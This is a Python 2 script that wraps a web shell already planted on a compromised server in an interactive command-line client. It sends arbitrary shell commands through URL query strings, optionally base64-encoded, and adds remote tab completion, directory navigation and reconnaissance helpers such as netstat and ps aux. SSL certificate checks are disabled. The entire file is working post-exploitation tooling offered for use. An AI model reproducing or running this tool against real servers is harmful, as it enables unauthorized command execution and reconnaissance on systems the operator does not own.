#!/usr/bin/python
# -*- coding: utf-8 -*-

# Sometimes you get a php/perl/python/ruby shell on a server... 
# Because typing again and again on the browser address bar is quite uneffective. 
# This wrapper provides you with a way to wrap your address bar query into a nice web shell
# Bash like completion is a must have
# Colors are nice too. 

# TODO: command helper (tab + tab => ifconfig )
# TODO: complete http/https support
# TODO: add assymetrical shell encryption 
# TODO: Check if metasploit has something similar

import httplib2
import sys
import cmd2
from cmd2 import Cmd
import urllib
import os
import re
from base64 import b64encode
from argparse import ArgumentParser
import traceback

#TODO: parse args

helpers = [
    "ifconfig",
    "service",
    "netstat -lntp",
    "netstat -antp",
    "ps aux"]

# Used in forge_request
extra_path = '/sbin:/usr/sbin'

class webshell(Cmd):
	url = ''
	enc = 'plain'
	hostname = ''
	user = ''
	path = ''
	home = ''	## Exploit base
	prompt_suffix = '$'
	status = ''
	prompt = 'wsh :'
	h = httplib2.Http(".cache", disable_ssl_certificate_validation=True)
	colors=1

	colorcodes =    {'bold':{True:'\x1b[1m',False:'\x1b[22m'},
               'cyan':{True:'\x1b[36m',False:'\x1b[39m'},
                  'orange':{True:'\x1b[33m',False:'\x1b[39m'},
                  'blue':{True:'\x1b[34m',False:'\x1b[39m'},
                  'red':{True:'\x1b[31m',False:'\x1b[39m'},
                  'magenta':{True:'\x1b[35m',False:'\x1b[39m'},
                  'green':{True:'\x1b[32m',False:'\x1b[39m'},
                  'underline':{True:'\x1b[4m',False:'\x1b[24m'}}

	def colorize(self, val, color):
		return self.colorcodes[color][True] + val + self.colorcodes[color][False]

	def init(self, url, enc):
		self.url = url
		self.enc = enc
		self.get_remote_info()
		self.set_prompt()

	def get_remote_info(self):
		self.username = self.ask_server('whoami')
		self.hostname = self.ask_server('hostname -s')
		self.path = self.ask_server('pwd')
		self.home = os.path.normpath(self.path)


	def set_prompt(self):
		retcode = self.colorize(self.status,'underline')
		if self.status == '200':
			retcode = self.colorize(retcode,'green')
		else:
			retcode = self.colorize(retcode,'red')
		
		username = self.colorize(self.username, 'orange')
		hostname = self.colorize(self.hostname,'blue')
		curpath  = self.colorize(self.path, 'blue') 
		suffix   = self.colorize(self.prompt_suffix, 'green')

		self.prompt = '{'+ retcode + '}' + username  + ':' + curpath + suffix + ' '
		#self.prompt = '{'+ retcode + '}' + username + '@' + hostname + ':' + self.path + self.prompt_suffix + ' '
	
	def ask_server(self, request):
		if self.enc == 'base64':
			request = b64encode(request)
		req = urllib.quote_plus(request)
		resp, content = self.h.request(self.url + req , "GET")	
		self.status = str(resp.status)
		#ret = content
		ret = content.strip()
		if self.status != '200':
			ret = '-'
		return ret
	
	def precmd(self, line):
		self.set_prompt()
		return line

	def postcmd(self, stop, line):
		self.set_prompt()
		if stop: 
			exit()
	
	def forge_request(self, path, cmd ):
		req = "export PATH=$PATH:" + extra_path + "; cd " + path + ';' + cmd + " 2>&1;"
		return req

	def default(self, line):
		try:
			req = self.forge_request(self.path, line);
			resp = self.ask_server(req)
			self.stdout.write(resp + '\n')
			self.set_prompt()
		except :
			print 'dammit'


	def completedefault(self, text, line, begidx, endidx): 
		args = line.split(' ')
		call = args.pop(0)
		(head, tail) = os.path.split(args[0])
#		print '\nh:'+head
#		print '\nt:'+tail
	
		if os.path.isabs(args[0]):
			req = self.forge_request(head, 'ls -1A')
			
		elif self.path is '/' :
			req = self.forge_request(self.path + head, 'ls -1A')
		
		else :
			req = self.forge_request(self.path +'/'+ head, 'ls -1A')

		resp = self.ask_server(req)
		get  = resp.split('\n')
		opts = [x for x in get if x.startswith(tail) ]
		return opts
	
	def do_cd(self, arg):
		if arg == '~' or arg == '': 
			self.path = self.home
		else:	
			npath = os.path.join(self.path, arg)
			req = self.forge_request(self.path, '[ -d' + npath + ' ] || echo o')
			ans = self.ask_server(req)
			self.path = os.path.normpath(npath)
			
	def do_path(self, arg):
		print self.path
	
	def preloop(self):
		pass

class arg_parser:
	enc = ''
	url = ''
	parser = ArgumentParser(description="Let the web be command-line.")

	def __init__(self):
		self.parser.add_argument("url", help="Enter the full target URL where the shell/cmd can be executed.Example: www.example.com/shell.php")
		self.parser.add_argument("-e", "--enc", action="store", dest="enc", default='plain', help="Encoding/encryption to use. (Default: plain) ")
		self.args = self.parser.parse_args()
		self.enc = self.args.enc
		self.url = self.args.url

		# DELETE sys.argv (since everything has been parsed)
		del sys.argv[1:]

if __name__ == "__main__":		
	try:
		params = arg_parser()

		ws = webshell()
		ws.init(params.url, params.enc)
		ws.cmdloop()
	except :
		print 'exception'
		print traceback.format_exc()

